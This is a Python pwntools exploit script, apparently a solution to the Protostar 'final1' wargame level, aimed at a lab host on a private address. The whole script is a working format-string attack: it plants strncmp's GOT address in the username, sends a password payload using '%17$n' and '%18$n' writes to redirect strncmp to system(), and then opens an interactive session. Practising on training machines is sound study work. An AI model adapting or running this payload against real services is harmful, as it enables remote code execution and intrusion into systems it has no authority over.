import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

def int2byte(n):
    return str.encode(str(n))

our_ip, our_port = r.sock.getsockname()
padding = b"A" * (24 - len(f"{our_ip}:{our_port}"))
system_addr = 0xb7ecffb0 
strncmp_addr = 0x804a1a8

username_payload = padding + pwn.p32(strncmp_addr) + pwn.p32(strncmp_addr+2)
password_payload = b"%" + int2byte(0xffb0 - 0x3d - 0x4) + b"x" + b"%17$n" + b"%" + int2byte(0x1b7ec-0xffce+30) + b"x" + b"%18$n"

r.sendlineafter(b"[final1] $ ", b"username " + username_payload)
r.sendlineafter(b"[final1] $ ", b"login " + password_payload)

r.interactive()
r.close()